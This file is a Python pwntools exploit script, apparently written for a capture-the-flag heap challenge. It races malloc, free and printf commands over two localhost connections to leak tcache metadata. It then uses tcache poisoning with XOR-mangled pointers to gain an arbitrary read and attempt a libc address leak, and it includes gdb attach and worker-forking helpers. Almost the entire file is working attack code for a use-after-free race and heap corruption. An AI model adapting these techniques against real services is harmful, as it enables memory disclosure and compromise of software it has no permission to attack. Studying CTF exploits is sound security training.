#!/bin/python 

import os
import sys
import time
import signal
import argparse
import pwn as p

from functools import partial


SCANF_INPUT_SIZE = 1024
HEAP_FIRST_OFF   = 0xf30

DATA_PREFIX = b"MESSAGE: "
DATA_PREFIX_LEN = len(DATA_PREFIX)

TRIES = 10000

p.context.arch = 'amd64'
args = None
proc, elf, libc = (None, None, None)
gdb_pid = 0
pids = []


def get_server():
    global proc, elf, libc

    argv = (["sudo", "strace"] if args.strace else []) + [args.binary]
    if args.noaslr:
        proc = p.process(argv, setuid=False, aslr=False)
    else:
        proc = p.process(argv)

    elf  = p.ELF(args.binary) if args.strace else proc.elf
    libc = elf.libc
    assert libc is not None


def restart_server():
    proc.kill()
    get_server()


def attach_gdb(gdbscript="", pause=False):
    global gdb_pid
    if not (args.gef or args.pwndbg):
        return

    gdbscript = ("gef-init\n" if args.gef else "pwndbg-init\n") + gdbscript
    gdb_pid = p.gdb.attach(proc, gdbscript=gdbscript)
    time.sleep(1)

    if pause:
        input("Press any key to continue gdb... ")


def detach_gdb():
    global gdb_pid
    if not gdb_pid:
        return 

    input("\nPress any key to kill gdb...\n")
    try:
        os.kill(gdb_pid, signal.SIGTERM)
    except:
        pass
    gdb_pid = 0


class thread_comm(p.remote):
    def __init__(self, host="localhost", port=1337, do_send=True):
        if proc is None:
            print("!WARNING! Proc wasnt started.")
        super().__init__(host, port)
        self.own_payload = b""
        self.do_send = do_send
        self.alloc_blown = False
        self.last_blown_idx = -1
        time.sleep(0.1)


    def prompt_cmd(self, cmd, idx=b'', suffix=b''):
        if len(cmd) > SCANF_INPUT_SIZE:
            print("!WARNING! Length of cmd is larger than input max size.")
            cmd = cmd[:SCANF_INPUT_SIZE]

        if isinstance(cmd, str):
            cmd = cmd.encode()
        if isinstance(idx, int):
            idx = str(idx).encode()
        cmd += b' ' + idx + b' ' + suffix

        if self.do_send:
            self.sendline(cmd)
        else:
            self.own_payload += cmd + b' '


    def set_blown_idx(self, idx):
        self.last_blown_idx = idx


    def get_available_idx(self):
        return self.last_blown_idx + 1


    def quit(self):
        self.prompt_cmd(b"quit")
        time.sleep(0.1)


    def get_payload(self):
        ret = self.own_payload[:-1]
        self.own_payload = b""
        return ret


    def printf(self, idx, do_recv=True):
        self.prompt_cmd(b"printf", idx)
        if do_recv:
            self.recvuntil(DATA_PREFIX)
            return self.recvline(drop=True)


    def malloc(self, idx):
        if self.alloc_blown:
            print("Careful! Using thread for allocation that has set alloc blown")
        self.prompt_cmd(b"malloc", idx)


    def scanf(self, idx, msg):
        self.prompt_cmd(b"scanf", idx, msg)


    def free(self, idx, check=True):
        if check and idx <= self.last_blown_idx:
            print("Careful! Using idx that maybe has corrupted metadata and cannot be freed")
        self.prompt_cmd(b"free", idx)


    def send_flag(self, data: bytes):
        self.prompt_cmd(b"send_flag " + data)
        if self.recvuntil(b"pwn.", timeout=2) != b"":
            return self.recv(55)
        return b""


def make_workers(num: int, fn, *args):
    for i in range(num):
        pid = os.fork()
        if not pid:
            for _ in range(TRIES):
                fn(*args)
            sys.exit(0)
        pids.append(pid)


def wait_workers():
    for pid in pids:
        os.wait()
        pids.pop()


def kill_workers():     # hmh, I mean retire*
    print(pids)
    for pid in pids:
        os.kill(pid, 9) # trust me


def to_addr(b: bytes):
    return p.u64(b[:8].ljust(8, b'\x00'))


def fix_idx(idx):
    return idx if isinstance(idx, bytes) else str(idx).encode()


# We malloc, scanf 8 random bytes to buffer and then race:
# thd1: strlen(buf) => returns 8 bytes
# thd2: free(buf)   => get metadata into buf
# thd1: write(1, buf, stlren) => syscall writing out the metadata
def tcache_leak(thd1: thread_comm, thd2: thread_comm):
    scanf_bytes = p.cyclic(8)

    thd1.do_send = False
    thd1.malloc(0)
    thd1.scanf(0, scanf_bytes)
    thd1.free(0)
    make_workers(1, thd1.sendline, thd1.get_payload())
    thd1.do_send = True

    for _ in range(TRIES):
        thd2.printf(0, do_recv=False)
    wait_workers()

    results = set(thd2.clean().splitlines())
    # print(results)
    for res in results:
        ret = res[DATA_PREFIX_LEN:]
        if len(ret) == 8 and ret != scanf_bytes:
            return to_addr(ret)

    return 0


def get_tcache_leak(thd1, thd2):
    tcache_addr = 0
    for _ in range(TRIES):
        tcache_addr = tcache_leak(thd1, thd2)
        if tcache_addr:
            break
        print("...")
    return tcache_addr


def setup_custom_alloc(thd1, thd2, target_addr):
    packed_addr = p.p64(target_addr).split(b'\x00')[0].strip()

    idx = thd1.get_available_idx()
    thd1.malloc(idx)
    thd1.malloc(idx+1)
    thd1.free(idx+1)

    failed = True
    for _ in range(TRIES):
        if not os.fork():
            thd1.free(idx)
            sys.exit(0)
        thd2.send((b"scanf %d " % idx + packed_addr + b'\n') * 2000)
        os.wait()

        time.sleep(0.1)
        thd1.malloc(idx)
        data = thd1.printf(idx)

        # because printf stops writing on a NULL byte
        if data[:8] == packed_addr:
            failed = False
            thd2.quit()
            break

    if failed:
        # import IPython; IPython.embed()
        return b""

    attach_gdb('''
        b malloc 
        c
    ''')
    
    thd1.malloc(idx+1)
    thd1.set_blown_idx(idx+1)
    thd1.alloc_blown = True
    return idx+1


# maybe check if target_addr is a mod of 16
def arbitrary_read(thd1, thd2, target_addr: int):
    idx = setup_custom_alloc(thd1, thd2, target_addr)
    return thd1.printf(idx)


def leak_libc():
    thd1, thd2 = (None, None)
    for _ in range(TRIES):
        thd1 = thread_comm()
        thd2 = thread_comm()

        tcache_xored_loc = get_tcache_leak(thd1, thd2)
        if not tcache_xored_loc:
            print(b"No tcache leak...")
            continue
        print("tcache xored loc:", hex(tcache_xored_loc))

        target_addr = (tcache_xored_loc << 12) + HEAP_FIRST_OFF - 0x20
        print("Target addr:", hex(target_addr))
        target_addr ^= tcache_xored_loc
        print("Target addr (xored):", hex(target_addr))
        idx = setup_custom_alloc(thd1, thd2, target_addr)

        thd1.scanf(idx, p.cyclic(15))
        attach_gdb("b fprintf\nc", pause=True)
        libc_leak = thd1.printf(idx)

        print(libc_leak, "\n")
        if (len(libc_leak[16:]) != 6):
            restart_server()
            continue

        print(to_addr(libc_leak))
        # attach_gdb(pause=True)

    return (thd1, thd2)


def exploit():
    # attach_gdb('''
    #     b challenge
    #     c
    #     b malloc
    #     b free
    #     c
    #     finish
    # ''')
    # thd1, thd2 = leak_libc()
    
    thd1 = thread_comm()
    thd2 = thread_comm()

    tcache_xored_loc = get_tcache_leak(thd1, thd2)
    if not tcache_xored_loc:
        print(b"No tcache leak...")
        return 
    target_addr = (tcache_xored_loc << 12) + HEAP_FIRST_OFF - 0x10
    print("Target addr:", hex(target_addr))
    target_addr ^= tcache_xored_loc
    print("Target addr (xored):", hex(target_addr))
    data = arbitrary_read(thd1, thd2, target_addr)
    print(data)

    # flag = thd1.send_flag(b'')
    # print("FLAG:", flag)


def main():
    parser = argparse.ArgumentParser(usage="Usage: ./script.py [binary]")
    parser.add_argument('binary')
    parser.add_argument('-g', "--gef",    action='store_true')
    parser.add_argument('-p', "--pwndbg", action='store_true')
    parser.add_argument('-s', "--strace", action='store_true')
    parser.add_argument('-n', "--noaslr", action='store_true')
    parser.add_argument('-l', "--log-level", default='info', type=str)

    global args
    args = parser.parse_args()
    p.context.log_level = args.log_level

    get_server()
    exploit()

    proc.interactive()
    proc.kill()


if __name__ == '__main__':
    main()
